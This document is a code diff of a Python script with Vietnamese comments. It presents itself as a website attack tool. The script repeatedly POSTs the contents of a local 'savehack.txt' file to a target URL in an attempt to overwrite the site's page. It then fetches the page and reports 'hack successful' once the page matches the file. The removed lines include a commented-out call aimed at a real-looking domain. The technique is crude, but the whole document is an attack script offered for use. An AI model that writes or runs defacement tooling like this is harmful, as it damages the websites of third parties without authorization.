@@ -1,38 +1,64 @@
 import requests
 import time
+import sys
 import os
 
-def load_payload():
-    with open("savehack.txt", "r", encoding="utf-8") as f:
-        return f.read()
+# Màu sắc
+G = '\033[0;32m'
+R = '\033[0;31m'
+Y = '\033[0;33m'
+NC = '\033[0m'
 
-def run_attack(target_url):
-    # Lấy nội dung bạn đã sửa trong savehack.txt
-    my_code = load_payload()
+def load_savehack():
+    """Đọc nội dung đã chỉnh sửa từ savehack.txt"""
+    try:
+        with open("savehack.txt", "r", encoding="utf-8") as f:
+            return f.read().strip()
+    except FileNotFoundError:
+        print(f"{R}[!] Lỗi: Không tìm thấy file savehack.txt{NC}")
+        return None
+
+def attack():
+    if len(sys.argv) < 2:
+        print(f"{R}[!] Thiếu URL mục tiêu.{NC}")
+        return
+
+    target = sys.argv[1]
     
-    print(f"[*] Đang thực hiện tiêm toàn bộ nội dung từ savehack.txt...")
+    # Bước 1: Lấy 'Bản mẫu' từ file savehack.txt
+    my_payload = load_savehack()
+    if not my_payload: return
+
+    print(f"{G}=== ĐANG BẮT ĐẦU QUY TRÌNH OVERWRITE ==={NC}")
+    print(f"[*] Mục tiêu: {target}")
     
     while True:
         try:
-            # 1. Tấn công tiêm code
-            # Giả sử tool gửi POST để ghi đè hoặc chèn vào file index
-            requests.post(target_url, data={'content': my_code}, timeout=5)
+            # Bước 2: Tấn công tiêm văn bản code
+            # Tool sẽ gửi toàn bộ nội dung trong savehack.txt đi
+            requests.post(target, data={'content': my_payload}, timeout=5)
+            
+            # Bước 3: Sao chép toàn bộ HTML hiện tại của web mục tiêu để đối chiếu
+            response = requests.get(target, timeout=5)
+            current_web_code = response.text.strip()
 
-            # 2. Lấy code thực tế hiện tại của Web để so sánh
-            current_web_code = requests.get(target_url, timeout=5).text
-
-            # 3. SO SÁNH TUYỆT ĐỐI
-            if my_code.strip() == current_web_code.strip():
-                print("\n[██████████] 100% - HACK THÀNH CÔNG!")
-                print("[✓] Web mục tiêu hiện đã giống hệt file savehack.txt của bạn.")
+            # Bước 4: So sánh tuyệt đối (Xác thực không hiểu lầm)
+            if my_payload == current_web_code:
+                print(f"\n{G}[██████████] 100% - HACK THÀNH CÔNG!{NC}")
+                print(f"{G}[✓] Web hiện tại đã khớp hoàn toàn với savehack.txt.{NC}")
                 break
             else:
-                print("[!] Code vẫn chưa khớp. Đang tiếp tục đẩy dữ liệu...", end='\r')
-                
-            time.sleep(1) # Nghỉ để tránh lag máy
+                # Nếu không giống (kể cả lệch 1 dấu cách), tiếp tục tấn công
+                print(f"{Y}[!] Đang đồng bộ hóa code... (Vẫn còn sai lệch){NC}", end='\r')
+            
+            time.sleep(1)
+        except KeyboardInterrupt:
+            print(f"\n{R}[!] Đã dừng tấn công.{NC}")
+            break
         except Exception as e:
-            print(f"[!] Lỗi kết nối: {e}. Đang thử lại...")
+            print(f"\n{R}[!] Lỗi kết nối: {e}. Thử lại...{NC}")
             time.sleep(2)
 
-# Chạy tool
-# run_attack("https://robuxviet.com")
+if __name__ == "__main__":
+    attack()
+    
